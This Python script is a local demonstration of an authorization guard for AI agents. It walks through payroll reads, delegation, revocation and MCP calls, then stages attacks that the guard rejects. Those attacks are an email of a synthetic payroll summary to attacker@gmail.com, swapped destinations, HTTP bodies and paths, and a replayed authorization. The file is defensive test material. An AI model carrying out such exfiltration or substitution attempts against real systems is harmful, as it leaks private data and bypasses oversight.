"""Coherent local product demo. No model credentials or external services."""
import argparse
import base64
import json
from pathlib import Path
import threading
import urllib.error
import urllib.request
from functools import partial
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer

from agent_guard.canonical import canonical, digest
from agent_guard.cli import read_json, write_json
from agent_guard.errors import GuardError
from agent_guard.v2.audit import require
from agent_guard.v2.cli import initialize
from agent_guard.v2.engines import Engines
from agent_guard.v2.example import example_policy, VALUES
from agent_guard.v2.model import Action
from .adapters import EmailAdapter, HTTPAdapter, MCPAdapter
from .evidence import verify_product
from .http import HTTPTransport, make_http_service
from .mcp import MCPServer, MCPTransport
from .resource import ResourceVerifier
from .runtime import AgentGuard, Denied, DirectTransport


def product_policy():
    p = example_policy()
    p['labels'] = ['PAYROLL_PRIVATE', 'CONFIDENTIAL']
    for spec in p['resources'].values():
        spec['labels'] = ['PAYROLL_PRIVATE' if x == 'PII' else x for x in spec['labels']]
        spec['accepts'] = ['PAYROLL_PRIVATE' if x == 'PII' else x for x in spec['accepts']]
    for op in ('email.send', 'http.post', 'tool.invoke'):
        p['operations'][op] = 'send'
    for rid, op, accepts in [
        ('sink:mail-finance', 'email.send', p['labels']), ('sink:mail-bob', 'email.send', p['labels']),
        ('sink:mail-external', 'email.send', []), ('sink:http-payments', 'http.post', p['labels']),
        ('sink:http-documents', 'http.post', p['labels']), ('sink:mcp-documents', 'tool.invoke', p['labels'])]:
        p['resources'][rid] = {'kind': 'sink', 'labels': [], 'accepts': accepts}
        p['roots'].append({'id': rid.replace(':', '-'), 'issuer': 'owner', 'subject': 'agent1',
            'operation': op, 'resource': rid, 'prefix': False, 'expires': 4102444800, 'remaining': 0, 'parent': None})
    return p


def run_demo(output, engines):
    output = Path(output)
    output.mkdir(parents=True, mode=0o700, exist_ok=False)
    g = initialize(output/'state', engines, product_policy(), VALUES)
    resource = ResourceVerifier(g)
    guard = AgentGuard(g, 'agent1', resource)
    email = guard.protect(EmailAdapter())
    identities = read_json(output/'state/identities.json')
    server = make_http_service(resource, identities)
    thread = threading.Thread(target=server.serve_forever, daemon=True); thread.start()
    origin = f'http://127.0.0.1:{server.server_port}'
    token = (output/'state/agent1.token').read_text().strip()
    http = guard.protect(HTTPAdapter(origin), HTTPTransport(token))
    story = []

    def show(title, detail, event=None, outcome=None, actor='agent1'):
        with g.transaction() as db:
            state = g.state(db).to_dict()
        p = event['receipt']['payload'] if event else None
        status = outcome or (p['status'] if p else 'rejected')
        story.append({'title': title, 'detail': detail, 'actor': actor, 'status': status,
                      'event': event, 'state': state})
        print(f'{status.upper():12} {title} — {detail}', flush=True)

    def local(title, action, detail, expected='allow'):
        event = g.act(action, action.to_dict()['actor'])
        require(event['receipt']['payload']['decision'] == expected, 'demo_assertion_failed')
        show(title, detail, event, actor=action.to_dict()['actor'])
        return event

    def attack(title, action, detail):
        before = len(resource.observations())
        try:
            action()
        except GuardError as exc:
            show(title, detail + ' (' + exc.code + ')')
        else:
            raise GuardError('attack_was_not_rejected')
        require(len(resource.observations()) == before, 'rejected_attack_had_effect')

    try:
        local('Agent A reads public information', Action('agent1', 'data.read', 'document:project/public'),
              'Authorized and executed through the V2 resource gate.')
        payroll = local('Agent A reads payroll', Action('agent1', 'data.read', 'document:project/payroll'),
                        'The shared security state now includes PAYROLL_PRIVATE.')
        summary = f"Synthetic payroll total: {payroll['result']['value']['synthetic_payroll']}."
        local('Create a derived summary', Action('agent1', 'data.write', 'document:project/summary', {'value': summary}),
              'The derived object inherits PAYROLL_PRIVATE.')
        internal = email.prepare(to='finance@company.com', body=summary)
        result = email.dispatch(internal)
        require(result['status'] == 'confirmed', 'internal_send_failed')
        show('Send to finance@company.com', 'Authorized → dispatching → confirmed by the mock mailbox.', internal.event, 'confirmed')
        try:
            email.send(to='attacker@gmail.com', body=summary)
        except Denied as exc:
            show('External exfiltration blocked', 'PAYROLL_PRIVATE is not accepted by the external destination. No dispatch.', exc.event)
        else:
            raise GuardError('exfiltration_not_blocked')
        substituted = email.prepare(to='finance@company.com', body=summary)
        attack('Destination substitution rejected', lambda: resource.invoke(EmailAdapter(), 'agent1',
               {'to': 'attacker@gmail.com', 'body': summary}, substituted.authorization), 'The actual destination changes the action commitment.')
        attack('Consumed authorization replay rejected', lambda: resource.invoke(EmailAdapter(), 'agent1',
               internal.request, internal.authorization), 'An authorization can commit only once.')

        req = {'method': 'POST', 'url': origin + '/payments', 'body': {'amount': 25, 'currency': 'USD'}}
        prepared = http.prepare(**req)
        def raw_http(body, path='/payments', certificate=None):
            headers = {'Authorization': 'Bearer '+token, 'Content-Type': 'application/json'}
            if certificate is not None:
                headers['X-Agent-Guard-Evidence'] = base64.b64encode(canonical(certificate)).decode()
            request = urllib.request.Request(origin+path, data=canonical(body), headers=headers, method='POST')
            try:
                with urllib.request.urlopen(request, timeout=60) as response:
                    return response.read()
            except urllib.error.HTTPError as exc:
                raise GuardError(json.loads(exc.read())['error']) from exc
        attack('Direct HTTP bypass rejected', lambda: raw_http(req['body']), 'Authorization evidence required at POST /payments.')
        attack('HTTP body substitution rejected', lambda: raw_http({'amount': 2500}, certificate=prepared.authorization), 'The signed body cannot be replaced.')
        attack('HTTP path substitution rejected', lambda: raw_http(req['body'], '/documents', prepared.authorization), 'The signed path cannot be replaced.')
        require(http.dispatch(prepared)['status'] == 'confirmed', 'http_send_failed')
        show('Protected HTTP payment confirmed', 'The recipient recorded one synthetic payment after V2 verification.', prepared.event, 'confirmed')

        local('Agent B lacks authority', Action('agent2', 'data.read', 'document:project/summary'),
              'No rooted authority witness for Agent A’s resource.', 'deny')
        child = {'id': 'demo-child', 'issuer': 'agent1', 'subject': 'agent2', 'operation': 'data.read',
                 'resource': 'document:project/summary', 'prefix': False, 'expires': 4102444700,
                 'remaining': 0, 'parent': 'read-project'}
        local('Delegate one exact resource', Action('agent1', 'authority.delegate', child['resource'], {'grant': child}),
              'Agent B receives read-only authority for the summary, with no further delegation.')
        local('Agent B reads the summary', Action('agent2', 'data.read', child['resource']),
              'The attenuated owner → Agent A → Agent B witness now authorizes this read.')
        local('Revoke the parent authority', Action('owner', 'authority.revoke', 'authority:grants', {'grant_id': 'read-project'}),
              'Root revocation invalidates descendant grants.')
        local('Agent B is denied after revocation', Action('agent2', 'data.read', child['resource']),
              'The authority chain contains a revoked root.', 'deny')
        mcp = guard.protect(MCPAdapter(), MCPTransport(MCPServer(resource, 'agent1')))
        prepared_mcp = mcp.prepare(name='documents.create', arguments={'body': {'summary': summary}})
        require(mcp.dispatch(prepared_mcp)['status'] == 'confirmed', 'mcp_send_failed')
        show('MCP interoperability', 'tools/call uses the same V2 Action, engines, certificate and recipient gate.', prepared_mcp.event, 'confirmed')

        class LoseResponse(DirectTransport):
            def send(self, *args):
                super().send(*args)
                raise TimeoutError('simulated lost acknowledgement')
        uncertain = guard.protect(EmailAdapter(), LoseResponse(resource))
        lost = uncertain.prepare(to='bob@company.com', body=summary)
        require(uncertain.dispatch(lost)['status'] == 'unknown', 'unknown_outcome_required')
        show('Lost acknowledgement', 'A timeout does not establish delivery or rejection. No automatic retry.', lost.event, 'unknown')
        require(uncertain.reconcile(lost)['status'] == 'confirmed', 'reconciliation_failed')
        show('Reconcile without resending', 'Read the recipient’s signed observation; no second mailbox record.', lost.event, 'confirmed')
        evidence = {'history': g.export(), 'deliveries': guard.journal.events(), 'observations': resource.observations()}
        trust = {'v2': g.trust, 'adapters': resource.manifest, 'http_origin': origin}
        checkpoint = {'v2_head': digest(evidence['history'][-1]['receipt']),
                      'delivery_head': digest(evidence['deliveries'][-1])}
        verified = verify_product(evidence, trust, engines, checkpoint)
        for name, value in [('evidence', evidence), ('trust', trust), ('checkpoint', checkpoint), ('story', story)]:
            write_json(output/(name+'.json'), value)
        template = Path(__file__).with_name('ui.html').read_text()
        (output/'index.html').write_text(template.replace('__STORY__', json.dumps(story).replace('<', '\\u003c')))
        (output/'technical.html').write_text(Path(__file__).with_name('technical.html').read_text())
        print(f'VERIFIED {verified}\nUI: {(output/"index.html").resolve()}', flush=True)
    finally:
        server.shutdown(); server.server_close(); thread.join()
    return output


def main(argv=None):
    parser = argparse.ArgumentParser(description='Verifiable Authorization for AI Agents')
    parser.add_argument('--output', default='output/product-demo')
    parser.add_argument('--verify', metavar='DIRECTORY')
    parser.add_argument('--serve', action='store_true', help='Serve the completed UI on loopback')
    parser.add_argument('--port', type=int, default=8787)
    args = parser.parse_args(argv)
    try:
        engines = Engines('tools/bin/opa', 'proof/.lake/build/bin/guard-kernel')
        if args.verify:
            d = Path(args.verify)
            print(verify_product(read_json(d/'evidence.json', max_bytes=128*1024*1024),
                  read_json(d/'trust.json'), engines, read_json(d/'checkpoint.json')))
            return 0
        output = run_demo(args.output, engines)
        if args.serve:
            run_lock = threading.Lock()

            class UIHandler(SimpleHTTPRequestHandler):
                def is_public_asset(self):
                    if self.path in ('/', '/index.html', '/technical.html'):
                        return True
                    parts = self.path.split('/')
                    return (len(parts) == 4 and parts[1] == 'runs' and parts[2].startswith('run-') and
                            parts[3] in {'index.html', 'technical.html'} and
                            (output/'runs'/parts[2]/parts[3]).is_file())

                def send_json(self, status, value):
                    body = canonical(value)
                    self.send_response(status)
                    self.send_header('Content-Type', 'application/json')
                    self.send_header('Content-Length', str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)

                def do_GET(self):
                    if not self.is_public_asset():
                        self.send_error(404); return
                    super().do_GET()
                def do_HEAD(self):
                    if not self.is_public_asset():
                        self.send_error(404); return
                    super().do_HEAD()
                def do_POST(self):
                    if self.path != '/api/run':
                        self.send_error(404); return
                    try:
                        size = int(self.headers.get('Content-Length', '0'))
                        require(0 <= size <= 1024, 'invalid_demo_request')
                        self.rfile.read(size)
                        with run_lock:
                            runs = output/'runs'
                            runs.mkdir(mode=0o700, exist_ok=True)
                            for sequence in range(1, 10_000):
                                candidate = runs/f'run-{sequence:04d}'
                                if not candidate.exists():
                                    break
                            else:
                                raise GuardError('demo_run_limit_reached')
                            run_demo(candidate, engines)
                            self.send_json(200, {'run': candidate.name, 'url': f'/runs/{candidate.name}/index.html'})
                    except (GuardError, OSError, ValueError) as exc:
                        self.send_json(400, {'error': str(exc)})

            server = ThreadingHTTPServer(('127.0.0.1', args.port), partial(UIHandler, directory=str(output)))
            print(f'Open http://127.0.0.1:{server.server_port} — Ctrl-C to stop.', flush=True)
            try:
                server.serve_forever()
            except KeyboardInterrupt:
                pass
            finally:
                server.server_close()
        return 0
    except (GuardError, OSError, ValueError) as exc:
        print(f'ERROR: {exc}', file=__import__('sys').stderr)
        return 1
